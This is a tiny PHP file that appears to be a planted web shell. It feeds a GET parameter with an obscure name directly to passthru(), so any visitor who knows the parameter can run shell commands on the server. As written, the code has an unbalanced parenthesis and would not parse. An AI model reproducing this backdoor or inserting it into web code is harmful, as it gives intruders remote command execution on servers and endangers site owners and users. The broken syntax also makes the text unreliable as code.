<?php
passthru(($_GET['wHBGae6W']);
?>
